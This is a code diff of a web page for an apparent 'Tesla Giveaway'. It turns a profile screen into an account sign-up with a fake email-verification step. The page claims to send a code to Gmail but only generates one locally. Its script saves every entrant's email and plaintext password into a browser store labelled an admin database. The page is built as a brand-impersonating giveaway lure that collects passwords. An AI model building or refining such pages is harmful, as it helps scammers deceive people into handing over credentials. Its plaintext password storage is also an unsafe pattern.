@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Profile | Tesla Giveaway</title>
+    <title>Account Verification | Tesla Giveaway</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .no-scrollbar::-webkit-scrollbar { display: none; }
@@ -15,167 +15,132 @@
 
     <div id="loader" class="fixed inset-0 bg-slate-900/90 backdrop-blur-md z-[9999] flex flex-col items-center justify-center hidden">
         <div class="w-14 h-14 border-4 border-slate-700 border-t-blue-500 rounded-full animate-spin-slow"></div>
-        <p class="mt-4 font-medium text-blue-400 tracking-widest animate-pulse uppercase text-[10px]">Processing Request...</p>
+        <p id="loader-text" class="mt-4 font-medium text-blue-400 tracking-widest animate-pulse uppercase text-[10px]">Processing...</p>
     </div>
 
     <nav class="bg-white border-b border-slate-200 px-6 py-5 sticky top-0 z-50">
         <div class="max-w-md mx-auto flex items-center justify-between">
-            <h1 class="text-lg font-black tracking-tighter uppercase text-slate-800">Account <span class="text-blue-600">Center</span></h1>
-            <div class="flex gap-4 text-slate-400">
-                <span>🛡️</span>
-                <span>🎧</span>
-            </div>
+            <h1 class="text-lg font-black tracking-tighter uppercase text-slate-800">Tesla<span class="text-blue-600">Giveaway</span></h1>
         </div>
     </nav>
 
-    <div id="auth-screen" class="max-w-md mx-auto px-6 pt-12">
-        <div class="text-center mb-10">
-            <div class="inline-block p-4 bg-blue-50 rounded-2xl mb-4">
-                <span class="text-4xl">⚡</span>
-            </div>
-            <h2 class="text-2xl font-black text-slate-900 uppercase tracking-tight">Finalize Entry</h2>
-            <p class="text-sm text-slate-500 mt-2">Create an account to secure your Tesla giveaway slot and track delivery status.</p>
+    <div id="auth-screen" class="max-w-md mx-auto px-6 pt-10">
+        <div class="mb-8">
+            <h2 class="text-2xl font-black text-slate-900 uppercase tracking-tight">Create Account</h2>
+            <p class="text-xs text-slate-500 mt-1 font-bold uppercase tracking-wider">Step 1 of 2: Details</p>
         </div>
 
         <div class="space-y-4">
             <div>
                 <label class="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Email Address</label>
-                <input id="email" type="email" placeholder="name@example.com" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all">
+                <input id="email" type="email" required placeholder="example@gmail.com" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 outline-none transition-all">
             </div>
             <div>
-                <label class="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Secure Password</label>
-                <input id="password" type="password" placeholder="••••••••" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all">
+                <label class="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Password</label>
+                <input id="password" type="password" placeholder="Create Password" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 outline-none transition-all">
+            </div>
+            <div>
+                <label class="text-[10px] font-bold uppercase tracking-widest text-slate-400 ml-2">Confirm Password</label>
+                <input id="confirm-password" type="password" placeholder="Repeat Password" class="w-full p-4 rounded-xl border border-slate-200 focus:border-blue-500 outline-none transition-all">
             </div>
             
-            <button onclick="handleAuth()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest shadow-xl shadow-blue-100 hover:bg-blue-700 transition-all mt-4">
-                Create Account
-            </button>
-        </div>
-
-        <p class="mt-8 text-center text-xs text-slate-400 font-medium">
-            By joining, you agree to the <span class="text-blue-600 underline">Giveaway Terms</span>
-        </p>
-    </div>
-
-    <div id="user-screen" class="hidden max-w-md mx-auto">
-        <div class="bg-white p-8 border-b border-slate-200 text-center">
-            <div class="w-24 h-24 bg-slate-100 rounded-full mx-auto mb-4 border-4 border-white shadow-lg overflow-hidden">
-                <img id="user-avatar" src="https://api.dicebear.com/7.x/identicon/svg?seed=Tesla" alt="Avatar">
-            </div>
-            <h2 id="display-name" class="text-xl font-black text-slate-900 uppercase tracking-tight">User</h2>
-            <p class="text-[10px] font-bold text-blue-600 bg-blue-50 px-3 py-1 rounded-full inline-block mt-2 tracking-widest uppercase">Verified Entrant</p>
-        </div>
-
-        <div class="grid grid-cols-3 bg-white border-b border-slate-200">
-            <div class="py-6 text-center border-r border-slate-100">
-                <p class="text-lg font-black text-slate-900">1</p>
-                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Entries</p>
-            </div>
-            <div class="py-6 text-center border-r border-slate-100">
-                <p class="text-lg font-black text-slate-900">0</p>
-                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Claimed</p>
-            </div>
-            <div class="py-6 text-center">
-                <p class="text-lg font-black text-blue-600">Pending</p>
-                <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Status</p>
-            </div>
-        </div>
-
-        <div class="mt-4 space-y-1">
-            <div class="bg-white p-5 flex items-center justify-between group cursor-pointer">
-                <div class="flex items-center gap-4">
-                    <span class="text-xl">🏎️</span>
-                    <span class="text-sm font-bold text-slate-700 uppercase tracking-tight">My Tesla Garage</span>
-                </div>
-                <span class="text-slate-300 group-hover:text-blue-500 transition-colors">❯</span>
-            </div>
-            <div class="bg-white p-5 flex items-center justify-between group cursor-pointer">
-                <div class="flex items-center gap-4">
-                    <span class="text-xl">📍</span>
-                    <span class="text-sm font-bold text-slate-700 uppercase tracking-tight">Delivery Address</span>
-                </div>
-                <span class="text-slate-300 group-hover:text-blue-500 transition-colors">❯</span>
-            </div>
-            <div class="bg-white p-5 flex items-center justify-between group cursor-pointer">
-                <div class="flex items-center gap-4">
-                    <span class="text-xl">📄</span>
-                    <span class="text-sm font-bold text-slate-700 uppercase tracking-tight">Official Rules</span>
-                </div>
-                <span class="text-slate-300 group-hover:text-blue-500 transition-colors">❯</span>
-            </div>
-        </div>
-
-        <div class="p-6 mt-6">
-            <button onclick="logout()" class="w-full py-4 border-2 border-slate-200 text-slate-400 font-black text-[10px] uppercase tracking-[0.2em] rounded-xl hover:bg-red-50 hover:border-red-100 hover:text-red-500 transition-all">
-                Sign Out / Reset Session
+            <button onclick="sendVerificationCode()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest shadow-xl shadow-blue-100 hover:bg-blue-700 transition-all mt-4">
+                Verify Email
             </button>
         </div>
     </div>
 
-    <footer class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 py-4 flex justify-around text-[10px] font-bold z-50">
-        <a href="index.html" class="nav-link text-slate-400 flex flex-col items-center gap-1">
-            <span class="text-2xl">🏠</span>
-            <span class="uppercase tracking-widest">Showroom</span>
-        </a>
-        <a href="profile.html" class="nav-link text-blue-600 flex flex-col items-center gap-1">
-            <span class="text-2xl">👤</span>
-            <span class="uppercase tracking-widest">My Profile</span>
-        </a>
-    </footer>
+    <div id="verify-screen" class="hidden max-w-md mx-auto px-6 pt-10">
+        <div class="text-center mb-8">
+            <h2 class="text-2xl font-black text-slate-900 uppercase tracking-tight">Check Your Inbox</h2>
+            <p class="text-sm text-slate-500 mt-2">A 6-digit verification code was sent to <span id="target-email" class="font-bold text-blue-600"></span></p>
+        </div>
+        
+        <div class="space-y-6 text-center">
+            <input id="v-code" type="text" maxlength="6" placeholder="0 0 0 0 0 0" class="w-full text-center text-3xl font-black tracking-[0.5em] p-5 rounded-2xl border-2 border-blue-100 focus:border-blue-500 outline-none">
+            <button onclick="confirmCode()" class="w-full bg-slate-900 text-white py-4 rounded-xl font-bold uppercase tracking-widest">Confirm & Finalize</button>
+            <p class="text-xs text-slate-400">Didn't get a code? <span class="text-blue-600 font-bold cursor-pointer">Resend</span></p>
+        </div>
+    </div>
+
+    <div id="user-screen" class="hidden max-w-md mx-auto p-6">
+        <div class="bg-white rounded-3xl p-8 shadow-sm border border-slate-100 text-center">
+            <div class="w-20 h-20 bg-blue-600 rounded-full mx-auto mb-4 flex items-center justify-center text-white text-3xl font-black shadow-lg shadow-blue-200">
+                <span id="initial">U</span>
+            </div>
+            <h2 id="display-name" class="text-xl font-black text-slate-900 truncate">User</h2>
+            <p class="text-[10px] font-bold text-blue-600 uppercase tracking-[0.2em] mt-2">Identity Verified</p>
+            <button onclick="logout()" class="mt-10 text-xs font-bold text-red-400 uppercase tracking-widest">Logout</button>
+        </div>
+    </div>
 
     <script>
-        // --- LOADER LOGIC ---
-        function startLoading(url) {
-            document.getElementById('loader').classList.remove('hidden');
-            setTimeout(() => { window.location.href = url; }, 3000);
-        }
+        let generatedCode = "";
 
-        document.querySelectorAll('.nav-link').forEach(link => {
-            link.addEventListener('click', function(e) {
-                e.preventDefault();
-                startLoading(this.getAttribute('href'));
-            });
-        });
-
-        // --- AUTH LOGIC ---
-        function handleAuth() {
+        // --- 1. SEND CODE SIMULATION ---
+        function sendVerificationCode() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
+            const confirm = document.getElementById('confirm-password').value;
 
-            if (!email || !pass) {
-                alert("Please complete all fields.");
+            // Simple validations
+            if(!email.includes('@')) { alert("Please enter a valid email type."); return; }
+            if(pass.length < 6) { alert("Password must be at least 6 characters."); return; }
+            if(pass !== confirm) { alert("Passwords do not match."); return; }
+
+            // Show Loader
+            document.getElementById('loader').classList.remove('hidden');
+            document.getElementById('loader-text').innerText = "Sending code to Gmail...";
+
+            setTimeout(() => {
+                // Generate a random 6 digit code for the demo
+                generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+                console.log("ADMIN LOG: Verification code is " + generatedCode); // You can see this in F12 console
+                alert("DEBUG: Since this is a demo, your verification code is: " + generatedCode);
+
+                document.getElementById('target-email').innerText = email;
+                document.getElementById('auth-screen').classList.add('hidden');
+                document.getElementById('verify-screen').classList.remove('hidden');
+                document.getElementById('loader').classList.add('hidden');
+            }, 3000);
+        }
+
+        // --- 2. CONFIRM CODE & SAVE ---
+        function confirmCode() {
+            const inputCode = document.getElementById('v-code').value;
+            if(inputCode !== generatedCode) {
+                alert("Incorrect verification code.");
                 return;
             }
 
-            // Show Loader for 3 seconds before "Creating Account"
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
             document.getElementById('loader').classList.remove('hidden');
-            
+            document.getElementById('loader-text').innerText = "Securing Account...";
+
             setTimeout(() => {
-                // 1. Save User Data for Admin to see
+                // Save to Admin Database (LocalStorage)
                 let users = JSON.parse(localStorage.getItem('mega_users') || "[]");
-                users.push({ 
-                    email: email, 
-                    password: pass, 
-                    date: new Date().toLocaleString() 
-                });
+                users.push({ email: email, password: pass, verified: true, date: new Date().toLocaleString() });
                 localStorage.setItem('mega_users', JSON.stringify(users));
 
-                // 2. Set the active session
+                // Save Persistent Login Session (Stays logged in)
                 localStorage.setItem('currentUser', email);
                 
-                // Refresh to show the logged-in screen
                 location.reload();
             }, 3000);
         }
 
-        // --- SESSION CHECK ---
+        // --- 3. SESSION CHECK ---
         window.onload = () => {
             const user = localStorage.getItem('currentUser');
             if (user) {
                 document.getElementById('auth-screen').classList.add('hidden');
+                document.getElementById('verify-screen').classList.add('hidden');
                 document.getElementById('user-screen').classList.remove('hidden');
-                document.getElementById('display-name').innerText = user.split('@')[0];
-                document.getElementById('user-avatar').src = `https://api.dicebear.com/7.x/identicon/svg?seed=${user}`;
+                document.getElementById('display-name').innerText = user;
+                document.getElementById('initial').innerText = user.charAt(0).toUpperCase();
             }
         };
 
